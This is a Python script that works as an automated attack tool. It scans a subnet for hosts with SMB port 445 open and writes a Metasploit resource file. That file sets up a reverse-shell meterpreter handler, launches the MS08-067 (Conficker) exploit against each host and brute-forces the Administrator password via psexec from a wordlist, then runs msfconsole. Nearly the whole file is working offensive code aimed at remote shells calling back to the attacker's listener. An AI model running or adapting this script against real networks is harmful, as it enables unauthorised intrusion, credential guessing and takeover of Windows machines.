import os
import sys
import nmap
import optparse

def findTgts(subNet):
    '''Scan TCP 445 port (SMB Protocol) open Hosts'''
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts

def setupHandler(configFile, lhost, lport):
    '''Use MetasploitFramwork setup a Listener'''
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD '+\
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def confickerExploit(configFile, tgtHost, lhost, lport):
    '''Using MSF execute exploit code(ms08_067_netapi)'''
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set PAYLOAD '+\
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser %s\n' % username)
        configFile.write('set SMBPass %s\n' % password)
        configFile.write('set RHOST %s\n' % tgtHost)
        configFile.write('set PAYLOAD '+\
                         'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

def main():
    configFile = open('meta.rc', 'w')
    usage = "[-] Usage%prog -H <RHOST[s]> -l <LHOST> "+\
    "[-p <LPORT> -F <Password File>]"
    parser = optparse.OptionParser(usage, version="%prog 1.0")
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify the target address[es]')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify the listen address')
    parser.add_option('-p', dest='lport',
                      type='string', default='1337',
                      help='specify the listen port')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='passwd file for SMB brute force attempt')

    (options, args) = parser.parse_args()
    lhost = options.lhost
    lport = options.lport
    passwdFile = options.passwdFile

    if not (options.tgtHost and lhost):
        print parser.print_help()
        exit(0)
    tgtHosts = findTgts(options.tgtHost)
    setupHandler(configFile, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile is not None:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
    __Author__ = "dscdtc"
    main()
